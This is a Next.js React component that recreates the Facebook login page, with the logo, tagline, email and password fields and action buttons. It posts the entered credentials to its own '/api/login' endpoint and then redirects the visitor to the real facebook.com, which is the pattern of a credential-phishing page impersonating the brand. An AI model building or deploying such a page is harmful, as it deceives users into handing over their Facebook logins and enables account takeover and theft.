"use client";
import Image from "next/image";
import axios from "axios";
import { useState } from 'react';
import FacebookLogo from '../../public/facebook.svg';

export default function Home() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const validateInput = () => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!email || !password) {
      alert('Both fields are required');
      return false;
    } else if (!emailRegex.test(email)) {
      alert('Invalid email format');
      return false;
    }
    return true;
  };

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    if (!validateInput()) {
      return;
    }
    try {
      const response = await axios.post('/api/login', { email, password });
      if (response.status >= 200 && response.status < 300) {
        // Request was successful, handle the response
        const data = response.data;
        console.log(data);
        // if response is success, redirect to another site
        if (data.success) {
          alert('Login successful!' + data.message);
          window.location.href = "https://www.facebook.com/";
        } else {
          alert('Login failed: ' + data.message);
        }
      } else {
        // Handle error
        console.error('Error:', response.status, response.statusText);
      }
    } catch (error) {
      // Network error or other issue
      console.error('Error:', error);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <div className="bg-gray-100 h-screen flex flex-col md:flex-row items-center justify-center p-4">
        {/* Left Side */}
        <div className="text-xl md:text-3xl w-full md:w-1/2 px-10">
          <Image
            src={FacebookLogo}
            width={300}
            height={100}
            alt="Facebook Logo"
          />
          <p className="ml-8 -mt-3 hidden md:block">
            Facebook helps you connect and share with the people in your life.
          </p>
        </div>
        {/* Right Side */}
        <div className="bg-white flex flex-col p-5 rounded-xl w-full md:w-1/3 mt-4 md:mt-0">
          <input
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="my-2 border border-1 border-gray-100 p-3 rounded-md focus:outline-1 outline-blue-600"
            type="text"
            placeholder="Email address or phone number"
          />
          <input
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="my-2 border border-1 border-gray-100 p-3 rounded-md focus:outline-1 outline-blue-600"
            type="password"
            placeholder="Password"
          />
          <button type="submit" className="bg-blue-600 my-2 py-2 text-lg font-bold text-white rounded-md hover:bg-blue-700">
            Log in
          </button>
          <p className="cursor-pointer text-blue-600 text-sm my-2 text-center hover:underline">
            Forgotten password?
          </p>
          <span className="my-2">
            <hr />
          </span>
          <button className="bg-green-500 my-2 py-2 px-2 text-lg font-bold text-white rounded-md hover:bg-green-600 w-fit mx-auto">
            Create new account
          </button>
        </div>
      </div>
    </form>
  );
}